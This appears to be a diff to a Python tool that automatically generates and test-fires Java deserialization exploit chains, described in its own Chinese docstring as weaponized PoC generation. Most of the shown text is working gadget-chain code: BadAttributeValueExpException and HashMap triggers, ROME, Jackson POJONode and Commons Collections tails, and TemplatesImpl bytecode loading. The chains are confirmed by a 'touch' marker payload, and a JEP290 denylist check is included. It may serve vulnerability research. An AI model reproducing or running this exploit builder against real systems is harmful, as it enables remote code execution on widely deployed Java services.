@@ -1,6 +1,6 @@
-"""JGDPoCGenAgent — 武器化 PoC 生成 (R39/R41, agent 默认产出)。
+"""JGDPoCGenAgent — 武器化 PoC 生成 (agent 默认产出)。
 
-内建完整性约束 (用户裁决 R42): 产出必须完整 — 每条链迭代尾巴候选
+内建完整性约束 (用户裁决 ): 产出必须完整 — 每条链迭代尾巴候选
 (toString 尾巴 / hashCode 尾巴家族 / CC 家族) 直到 RCE_DEMO_FIRED
 或候选穷尽并记录全部尝试; 不依赖任何外部人工补救。
 
@@ -70,7 +70,7 @@ public class PL{tag} extends
                 ("FIRED:" + System.currentTimeMillis()).getBytes());
             System.out.println("[PoC] RCE closure fired: "
                 + new File("{marker}").getAbsolutePath());
-            // R44(ds): 自打印全链调用栈 — 入口→gadget→defineClass→payload
+            // (ds): 自打印全链调用栈 — 入口→gadget→defineClass→payload
             for (StackTraceElement f : new Throwable().getStackTrace())
                 System.out.println("[PoC-frame] " + f);
         }} catch (Exception e) {{
@@ -97,7 +97,7 @@ public class PT{n} {{
         fl.setAccessible(true); fl.set(o, v);
     }}
     @SuppressWarnings("unchecked")
-    static Object rome_tail(byte[] tb) throws Exception {{
+    static Object templates_of(byte[] tb) throws Exception {{
         Object templates = Class.forName(
             "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl")
             .getDeclaredConstructor().newInstance();
@@ -109,10 +109,22 @@ public class PT{n} {{
                 "com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl")
                 .getDeclaredConstructor().newInstance());
         }} catch (Throwable ig) {{}}
+        return templates;
+    }}
+    @SuppressWarnings("unchecked")
+    static Object rome_tail(byte[] tb) throws Exception {{
         return Class.forName("com.sun.syndication.feed.impl.ObjectBean")
             .getDeclaredConstructor(Class.class, Object.class)
             .newInstance(Class.forName("javax.xml.transform.Templates"),
-                         templates);
+                         templates_of(tb));
+    }}
+    @SuppressWarnings("unchecked")
+    static Object jackson_tail(byte[] tb) throws Exception {{
+        // Jackson 尾巴: POJONode.toString → 序列化引擎 → POJO getter 分派
+        // → TemplatesImpl.getOutputProperties → newTransformer → defineClass
+        return Class.forName("com.fasterxml.jackson.databind.node.POJONode")
+            .getDeclaredConstructor(Object.class)
+            .newInstance(templates_of(tb));
     }}
     @SuppressWarnings("unchecked")
     static Object cc_tail(String cmd) throws Exception {{
@@ -146,7 +158,7 @@ public class PT{n} {{
     }}
     @SuppressWarnings("unchecked")
     static Object hash_tail_rome(byte[] tb) throws Exception {{
-        // R42: hashCode 触发尾巴 — EqualsBean(_bean=ObjectBean(Templates)).
+        // hashCode 触发尾巴 — EqualsBean(_bean=ObjectBean(Templates)).
         // hashCode 路径经 EqualsBean 分派最终触达 ObjectBean.toString→getter
         // (候选扫描实测, 不依赖理论)
         Object ob = rome_tail(tb);
@@ -171,6 +183,18 @@ public class PT{n} {{
     }}
     public static void main(String[] args) throws Exception {{
         String mode = args[0];
+        // Map 中介分派桥的扩展语法: <mode>:<cls>|<mapKey>|<mapIface>
+        String mapKey = null, mapIface = null;
+        int bi = mode.indexOf('|');
+        if (bi >= 0) {{
+            String rest = mode.substring(bi + 1);
+            mode = mode.substring(0, bi);
+            int ci = rest.indexOf('|');
+            if (ci >= 0) {{
+                mapKey = rest.substring(0, ci);
+                mapIface = rest.substring(ci + 1);
+            }} else {{ mapKey = rest; }}
+        }}
         String tailKind = args[1];
         byte[] tb = args[2].equals("-") ? null
             : Base64.getDecoder().decode(args[2]);
@@ -179,18 +203,31 @@ public class PT{n} {{
             tail = rome_tail(tb);
         }} else if ("rome_equalsbean_hash".equals(tailKind)) {{
             tail = hash_tail_rome(tb);
+        }} else if ("jackson_tostring".equals(tailKind)) {{
+            tail = jackson_tail(tb);
         }} else {{
             tail = cc_tail("touch " + "{marker}");
         }}
         Object root;
         if (mode.startsWith("bave:")) {{
-            Object b = make_bridge(mode.substring(5), tail);
+            Object b = make_bridge(mode.substring(5), tail, mapKey, mapIface);
             javax.management.BadAttributeValueExpException e =
                 new javax.management.BadAttributeValueExpException(null);
             set(e, "val", b);
             root = e;
+        }} else if (mode.startsWith("heq:")) {{
+            // equals 触发桥: HASHMAP_EQ 双实例同尾同哈希 —
+            // readObject 重哈希触发 equals 分派(配对层同款载体)
+            Object b1 = make_bridge(mode.substring(4), tail, mapKey, mapIface);
+            java.util.HashMap<Object, Object> m = new java.util.HashMap<>();
+            m.put(b1, "v");
+            try {{
+                Object b2 = make_bridge(mode.substring(4), tail, mapKey, mapIface);
+                m.put(b2, "v2");
+            }} catch (Throwable ig) {{}}
+            root = m;
         }} else {{
-            Object b = make_bridge(mode.substring(3), tail);
+            Object b = make_bridge(mode.substring(3), tail, mapKey, mapIface);
             java.util.HashMap<Object, Object> m = new java.util.HashMap<>();
             m.put(b, "v");
             root = m;
@@ -201,8 +238,9 @@ public class PT{n} {{
         }}
         System.out.println("BUILD_OK");
     }}
-    static Object make_bridge(String cls, Object tail) throws Exception {{
-        // R45 泛化装配: 构造器捷径 → 字段类型感知注入
+    static Object make_bridge(String cls, Object tail,
+            String mapKey, String mapIface) throws Exception {{
+        // 泛化装配: 构造器捷径 → 字段类型感知注入
         // (Object 直注 / 接口→Proxy 适配器路由 tail.toString / 具体不兼容→跳过)
         Class<?> c = Class.forName(cls);
         try {{
@@ -217,27 +255,57 @@ public class PT{n} {{
                 if (ps.length == 1 && ps[0] == Object.class)
                     return ct.newInstance(tail);
             }}
-            Object b = c.getDeclaredConstructor().newInstance();
-            if (!inject_fields(b, tail)) {{
+            Object b;
+            try {{
+                b = c.getDeclaredConstructor().newInstance();
+            }} catch (Throwable noCtor) {{
+                // 无 no-arg 构造器 → 序列化构造器直造(绕过构造副作用)
                 Constructor<?> ctor = sun.reflect.ReflectionFactory
                     .getReflectionFactory()
                     .newConstructorForSerialization(c,
                         Object.class.getDeclaredConstructor());
                 ctor.setAccessible(true);
                 b = ctor.newInstance();
-                inject_fields(b, tail);
+            }}
+            if (!inject_fields(b, tail, mapKey, mapIface)) {{
+                Constructor<?> ctor = sun.reflect.ReflectionFactory
+                    .getReflectionFactory()
+                    .newConstructorForSerialization(c,
+                        Object.class.getDeclaredConstructor());
+                ctor.setAccessible(true);
+                b = ctor.newInstance();
+                inject_fields(b, tail, mapKey, mapIface);
             }}
             return b;
         }} catch (Throwable t) {{ throw new RuntimeException(t); }}
     }}
     static boolean inject_fields(Object host, Object tail) throws Exception {{
+        return inject_fields(host, tail, null, null);
+    }}
+    static boolean inject_fields(Object host, Object tail,
+            String mapKey, String mapIface) throws Exception {{
         boolean any = false;
         for (Field f : host.getClass().getDeclaredFields()) {{
             if (Modifier.isStatic(f.getModifiers())
                     || Modifier.isTransient(f.getModifiers())) continue;
             Class<?> ft = f.getType();
             Object v;
-            if (ft == Object.class || ft.isInstance(tail)) {{
+            if (mapKey != null && java.util.Map.class.isAssignableFrom(ft)) {{
+                // Map 中介分派字段: 分派键(可逗号分隔多个) → tail(或其接口代理)
+                java.util.HashMap<Object, Object> mm = new java.util.HashMap<>();
+                Object pv = proxy_or_plain(tail, mapIface);
+                for (String fk : mapKey.split(",")) {{
+                    if (!fk.isEmpty()) mm.put(fk, pv);
+                }}
+                v = mm;
+            }} else if (mapKey != null && has_create_map(ft)) {{
+                java.util.HashMap<Object, Object> mm = new java.util.HashMap<>();
+                Object pv = proxy_or_plain(tail, mapIface);
+                for (String fk : mapKey.split(",")) {{
+                    if (!fk.isEmpty()) mm.put(fk, pv);
+                }}
+                v = create_map_for(ft, mm);
+            }} else if (ft == Object.class || ft.isInstance(tail)) {{
                 v = tail;
             }} else if (ft.isInterface()) {{
                 v = Proxy.newProxyInstance(ft.getClassLoader(),
@@ -251,6 +319,38 @@ public class PT{n} {{
             catch (Throwable ig) {{}}
         }}
         return any;
+    }}
+    static boolean has_create_map(Class<?> ft) {{
+        return create_map_for(ft, new java.util.HashMap<>()) != null;
+    }}
+    static Object create_map_for(Class<?> ft,
+            java.util.HashMap<?, ?> mm) {{
+        // Map 型转发字段构造: 本类型或其 clojure 实现类上的静态 create(Map)
+        if (java.util.Map.class.isAssignableFrom(ft))
+            return new java.util.HashMap<>(mm);
+        Class<?>[] cands;
+        try {{
+            cands = new Class<?>[]{{ ft,
+                Class.forName("clojure.lang.PersistentArrayMap"),
+                Class.forName("clojure.lang.PersistentHashMap")}};
+        }} catch (Throwable t) {{ cands = new Class<?>[]{{ ft }}; }}
+        for (Class<?> c : cands) {{
+            try {{
+                java.lang.reflect.Method m = c.getMethod("create",
+                    java.util.Map.class);
+                if (Modifier.isStatic(m.getModifiers())
+                        && ft.isAssignableFrom(c)) {{
+                    return m.invoke(null, mm);
+                }}
+            }} catch (Throwable ig) {{}}
+        }}
+        return null;
+    }}
+    static Object proxy_or_plain(Object tail, String mapIface) throws Exception {{
+        if (mapIface == null || mapIface.isEmpty()) return tail;
+        Class<?> ic = Class.forName(mapIface.replace('/', '.'));
+        return Proxy.newProxyInstance(ic.getClassLoader(),
+            new Class[]{{ ic }}, new TailAdapter(tail));
     }}
     static class TailAdapter implements InvocationHandler {{
         final Object tail;
@@ -285,7 +385,7 @@ public class PF{n} {{
 def compile_payload(jdk11: bool, tag: str) -> bytes | None:
     src = PAYLOAD_SRC.format(marker=MARKER, tag=tag)
     (DYN / f"PL{tag}.java").write_text(src, encoding="utf-8")
-    # R40: payload 统一用 javac17 编译(-source/-target 匹配目标 JVM;
+    # payload 统一用 javac17 编译(-source/-target 匹配目标 JVM;
     # --release 不允许 add-exports) — JDK11 无 javac
     javac17 = Path("/usr/lib/jvm/java-17-openjdk-amd64/bin/javac")
     if javac17.exists():
@@ -305,7 +405,7 @@ def compile_payload(jdk11: bool, tag: str) -> bytes | None:
 
 
 def find_jar_for(cls_dot: str) -> str | None:
-    """R41: 定位包含该类的语料 jar — PoC 构建用最小 CP,
+    """定位包含该类的语料 jar — PoC 构建用最小 CP,
     避免通配符 CP 上 shaded 变体抢注同名类。"""
     p = cls_dot.replace(".", "/") + ".class"
     for jar in sorted(ma.corpus_dir().glob("*.jar")):
@@ -322,15 +422,28 @@ def tail_jars(mode: str, bridge: str) -> str:
     jars = [find_jar_for(bridge),
             find_jar_for("com.sun.syndication.feed.impl.ObjectBean"),
             find_jar_for("com.sun.syndication.feed.impl.EqualsBean"),
-            find_jar_for("org.apache.commons.collections.keyvalue.TiedMapEntry")]
+            find_jar_for("org.apache.commons.collections.keyvalue.TiedMapEntry"),
+            find_jar_for("com.fasterxml.jackson.databind.node.POJONode"),
+            find_jar_for("com.fasterxml.jackson.databind.ObjectMapper"),
+            find_jar_for("com.fasterxml.jackson.core.JsonGenerator"),
+            find_jar_for("com.fasterxml.jackson.annotation.JsonProperty")]
     uniq = [f"{DYN}"] + [j for j in dict.fromkeys(jars) if j]
+    # 小语料(≤12 jar)全量挂载 — bridge 构造路径的传递依赖
+    # (spring-aop→spring-core Assert 一类)跨 jar, 最小 CP 会 CNF;
+    # 大语料仍走最小集防 shaded 变体抢注同名类
+    corpus = sorted(ma.corpus_dir().glob("*.jar"))
+    if len(corpus) <= 12:
+        for j in corpus:
+            sj = str(j)
+            if sj not in uniq:
+                uniq.append(sj)
     return ":".join(uniq)
 
 
 def _attempt(chain_id: str, mode: str, bridge: str, jdk11: bool,
              tail_kind: str, b64: str) -> dict:
-    """单次组装+点火尝试 (R42 完整性循环的一个候选)。
-    R43: ser 由 Java 写 Linux 侧 DYN (DrvFs 上 Java 新建文件间歇失败),
+    """单次组装+点火尝试 ( 完整性循环的一个候选)。
+    ser 由 Java 写 Linux 侧 DYN (DrvFs 上 Java 新建文件间歇失败),
     再由 Python 拷入 pocs/。"""
     out_dir = POC_DIR / chain_id
     out_dir.mkdir(parents=True, exist_ok=True)
@@ -375,19 +488,24 @@ def _attempt(chain_id: str, mode: str, bridge: str, jdk11: bool,
 
 
 def build_and_verify(chain_id: str, mode: str, bridge: str,
-                     jdk11: bool) -> dict:
-    """R42 内建完整性: 迭代尾巴候选直到 RCE_DEMO_FIRED 或穷尽记录。
+                     jdk11: bool, tails_present: set | None = None) -> dict:
+    """内建完整性: 迭代尾巴候选直到 RCE_DEMO_FIRED 或穷尽记录。
     HashMap(hashCode 触发) 与 BAVE(toString 触发) 的候选序不同;
     候选失败原因全部留档供 ds 审计。"""
+    if tails_present is None:
+        tails_present = {t["lib"] for t in select_tail(ma.corpus_dir())
+                         if t["present"]}
     tag = f"{int(time.time()) % 100000}{abs(hash(chain_id)) % 97:02d}"
     tb = compile_payload(jdk11, tag)
     if not tb:
         return {"chain": chain_id, "status": "PAYLOAD_COMPILE_FAIL"}
     import base64
     b64 = base64.b64encode(tb).decode()
-    order = (["rome_equalsbean_hash", "rome_tostring", "cc3"]
-             if mode.startswith("hm:")
-             else ["rome_tostring", "rome_equalsbean_hash", "cc3"])
+    order = tail_order(mode, tails_present)
+    if not order:
+        return {"chain": chain_id, "status": "NO_TAIL_LIB_IN_TARGET",
+                "mode": mode, "bridge": bridge,
+                "jdk": "11" if jdk11 else "17", "attempts": []}
     attempts = []
     for tk in order:
         r = _attempt(chain_id, mode, bridge, jdk11, tk, b64)
@@ -400,7 +518,7 @@ def build_and_verify(chain_id: str, mode: str, bridge: str,
                     "fired_at_deser": r.get("fired_at_deser"),
                     "ser": r.get("ser"),
                     "attempts": attempts,
-                    "completeness": "agent-internal tail loop (R42)"}
+                    "completeness": "agent-internal tail loop "}
     return {"chain": chain_id, "status": "CHAIN_NOT_CLOSED",
             "mode": mode, "bridge": bridge, "jdk": "11" if jdk11 else "17",
             "attempts": attempts}
@@ -424,7 +542,7 @@ CHAINS = [
 
 
 def derive_chains(cap: int = 8) -> list[dict]:
-    """R45 通用派生: 链清单从挖掘产物自动生成, 不再手工硬编码。
+    """通用派生: 链清单从挖掘产物自动生成, 不再手工硬编码。
 
     优先级: jgd_entry_audit(T1桥) > jgd_chain_audit CONFIRM > DEPTH2 evidence 桥聚类代表。
     每桥: 静态取证(bridge_detail 触发方法) → 可用载体(toString→bave/hashCode→hm),
@@ -469,18 +587,32 @@ def derive_chains(cap: int = 8) -> list[dict]:
             continue
         trig = {t.get("trigger", "") for t in ev.get("bridge_detail", [])}
         needs = ev.get("needs_jdk", 11)
-        if "toString" in trig and needs <= 11:
+        mg = next((t for t in ev.get("bridge_detail", [])
+                   if t.get("via") == "mapget"), None)
+        if mg:
+            # Map 中介分派桥: 全部触发键 + 目标接口
+            all_keys = ",".join(sorted({t.get("map_key") or ""
+                                        for t in ev.get("bridge_detail", [])
+                                        if t.get("via") == "mapget"} - {""}))
+            iface = (mg.get("map_iface") or "").replace("/", ".")
+            t0 = mg.get("trigger", "hashCode")
+            pre = "bave" if t0 == "toString" else ("heq" if t0 == "equals" else "hm")
+            mode, j11 = f"{pre}:{cls}|{all_keys}|{iface}", needs <= 11
+        elif "toString" in trig and needs <= 11:
             mode, j11 = f"bave:{cls}", True
-        elif "hashCode" in trig or "equals" in trig:
+        elif "hashCode" in trig:
             mode, j11 = f"hm:{cls}", needs <= 11
+        elif "equals" in trig:
+            mode, j11 = f"heq:{cls}", needs <= 11
         elif "toString" in trig:
             mode, j11 = f"bave:{cls}", False
         else:
             continue
         out.append({"id": cls.split(".")[-1].lower() + "-" +
-                    ("bave" if mode.startswith("bave") else "hashmap"),
+                    ("bave" if mode.startswith("bave")
+                     else "hasheq" if mode.startswith("heq") else "hashmap"),
                     "mode": mode, "bridge": cls, "jdk11": j11,
-                    "tier": "auto-derived(R45)"})
+                    "tier": "auto-derived( )"})
         if len(out) >= cap:
             break
     print(f"[derive] 挖掘产物派生 {len(out)} 条链: "
@@ -490,6 +622,8 @@ def derive_chains(cap: int = 8) -> list[dict]:
 
 TAIL_LIBS = [
     ("rome", "com.sun.syndication.feed.impl.ObjectBean", "ROME ObjectBean→ToStringBean→getter"),
+    ("jackson", "com.fasterxml.jackson.databind.node.POJONode",
+     "Jackson POJONode→序列化 getter 分派→TemplatesImpl"),
     ("commons-collections", "org.apache.commons.collections.functors.InvokerTransformer",
      "CC InvokerTransformer 链"),
     ("commons-collections4", "org.apache.commons.collections4.functors.InvokerTransformer",
@@ -500,9 +634,23 @@ TAIL_LIBS = [
     ("jython", "org.python.util.PythonInterpreter", "Jython eval"),
 ]
 
+_TAIL_LIB_OF = {"rome_tostring": "rome", "rome_equalsbean_hash": "rome",
+                "jackson_tostring": "jackson", "cc3": "commons-collections"}
+
+
+def tail_order(mode: str, present: set) -> list[str]:
+    """尾巴候选序 — 只排目标语料实际在场的尾巴库, 触发模式决定优先序。"""
+    if mode.startswith("heq:"):
+        pref = ["rome_tostring", "cc3"]
+    elif mode.startswith("hm:"):
+        pref = ["rome_equalsbean_hash", "rome_tostring", "cc3"]
+    else:
+        pref = ["rome_tostring", "jackson_tostring", "rome_equalsbean_hash", "cc3"]
+    return [t for t in pref if _TAIL_LIB_OF[t] in present]
+
 
 def select_tail(corpus: Path) -> list[dict]:
-    """R40: 尾巴自动选型 — 扫目标语料里实际在场的尾巴库。"""
+    """尾巴自动选型 — 扫目标语料里实际在场的尾巴库。"""
     names = set()
     for jar in corpus.glob("*.jar"):
         try:
@@ -525,7 +673,7 @@ DENY_PATTERNS = [
 
 
 def jep290_profile(chain_classes: list[str]) -> dict:
-    """R40: JEP290 姿态建模 — 常见 denylist/仅java白名单下链是否可用。"""
+    """JEP290 姿态建模 — 常见 denylist/仅java白名单下链是否可用。"""
     hits = sorted({c for c in chain_classes
                    for p in DENY_PATTERNS
                    if c.startswith(p.replace(".", "/")) or c.startswith(p)})
@@ -565,14 +713,30 @@ def main() -> int:
                         False)
     chains = derive_chains(cap=8) if rome_present else []
     if not chains:
-        chains = CHAINS
-        print("[poc] 无挖掘产物可派生, 使用兜底三条")
-    # R51(D5): 链间并行 — JVM 冷启动等待是 90% wall, 串行浪费
+        chains = [c for c in CHAINS if find_jar_for(c["bridge"])]
+        if len(chains) < len(CHAINS):
+            print(f"[poc] 兜底链中 {len(CHAINS) - len(chains)} 条桥类不在"
+                  f"当前语料, 已剔除(桥不在场则链不可组装, 不空跑)")
+    if not chains:
+        print("[poc] 当前语料无任何已挖掘/兜底链的桥类在场 — PoC 阶段跳过")
+        POC_DIR.mkdir(exist_ok=True)
+        (POC_DIR / "poc_results.json").write_text(json.dumps(
+            {"results": [], "acceptance": "SKIPPED_NO_BRIDGE_IN_TARGET",
+             "corpus": str(corpus)}, ensure_ascii=False, indent=1),
+            encoding="utf-8")
+        (POC_DIR / "README.md").write_text(
+            "# JGD PoC 产物\n\n当前目标语料中没有任何已挖掘链或兜底链的"
+            "桥类在场, PoC 生成不适用(桥不在场则链不可组装)。\n"
+            f"目标语料: `{corpus}`\n", encoding="utf-8")
+        print("[poc] dsh 验收: skipped (语料内无可用桥)")
+        return 0
+    # 链间并行 — JVM 冷启动等待是 90% wall, 串行浪费
+    _present = {t["lib"] for t in tails if t["present"]}
     from concurrent.futures import ThreadPoolExecutor
     with ThreadPoolExecutor(max_workers=3) as _pex:
         results = list(_pex.map(
             lambda c: build_and_verify(c["id"], c["mode"], c["bridge"],
-                                       c["jdk11"]), chains))
+                                       c["jdk11"], _present), chains))
     meta = {c["id"]: c for c in chains}
 
     lines = ["# JGD PoC 产物", "",
